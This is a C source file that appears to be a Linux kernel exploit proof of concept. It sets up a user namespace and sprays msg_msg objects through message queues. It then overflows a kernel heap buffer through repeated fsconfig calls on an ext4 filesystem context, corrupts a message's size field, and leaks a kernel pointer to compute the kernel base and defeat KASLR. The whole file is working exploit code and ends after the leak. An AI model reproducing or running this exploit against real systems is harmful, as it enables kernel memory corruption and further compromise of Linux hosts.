#include "util.h"

#define _GNU_SOURCE

#define SPRAY_COUNT (0x30)
#define MSG_SIZE (0xfe8)

const uint64_t SINGLE_START_OFFSET = 0x21ace0;

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    
    return;
}

int main() {
    printf("[*] pid @ %d\n", getpid());

    unshare_setup(getuid(), getgid());

    long msg_type = 1;

    char msg_buf[MSG_SIZE + 1];
    memset(msg_buf, 0x41, MSG_SIZE);
    msg_buf[MSG_SIZE] = '\0';

    for (int i = 0; i < SPRAY_COUNT; i++)
        send_msg(new_queue(), msg_type, msg_buf, MSG_SIZE);

    int queue_arr[SPRAY_COUNT];

    for (int i = 0; i < SPRAY_COUNT; i++) {
        queue_arr[i] = new_queue();
        send_msg(queue_arr[i], msg_type, msg_buf, MSG_SIZE);
	    open("/proc/self/stat", O_RDONLY);
    }

    for (int i = 1; i < SPRAY_COUNT; i += 2)
        recv_msg(queue_arr[i], msg_type, msg_buf, MSG_SIZE);

    int fd = fsopen("ext4", 0);
    if (fd < 0) {
	    perror("fsopen");
        exit(1);
    }
    printf("[*] fd @ %d\n", fd);

    char buf[0x100] = { 0, };

    memset(buf, 0x41, 0x11 - 2);
    for (int i = 0; i < 0xf; i++)
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buf, 0);

    memset(buf, 0x41, 0x100 - 2);
    for (int i = 0; i < 0xf; i++)
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buf, 0);

    for (int i = 1; i < SPRAY_COUNT; i += 2) {
        send_msg(queue_arr[i], msg_type, buf, MSG_SIZE);
	    open("/proc/self/stat", O_RDONLY);
    }

    // /* one msg_msg structure for each message */
    // struct msg_msg {
    // 	struct list_head m_list;
    // 	long m_type;
    // 	size_t m_ts;		/* message text size */
    // 	struct msg_msgseg *next;
    // 	void *security;
    // 	/* the actual message follows immediately */
    // };

    memset(buf, 0x00, sizeof(buf));
    memset(buf, 0x41, 0x17);
    buf[0x17] = '\x10';
    buf[0x18] = '\x12';

    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buf, 0);

    char received_msg[0x1210];
    uint64_t kernel_single_start = 0;
    memset(received_msg, 0x00, sizeof(received_msg));

    for (int i = 0; i < SPRAY_COUNT; i++) {
        recv_msg(queue_arr[i], msg_type, received_msg, sizeof(received_msg));
        
        kernel_single_start = ((uint64_t *)received_msg)[0xfe8 / sizeof(uint64_t)];
        if (kernel_single_start > 0xFFFF000000000000)
            break;

        memset(received_msg, 0x00, sizeof(received_msg));
    }

    if (kernel_single_start == 0) {
        printf("[-] Failed to kbase_leak...\n");
        exit(1);
    }

    uint64_t kernel_base = kernel_single_start - SINGLE_START_OFFSET;

    printf("[*] kernel_base @ 0x%lx\n", kernel_base);
    printf("[*] kernel_single_start @ 0x%lx\n", kernel_single_start);

    debug();

    return 0;
}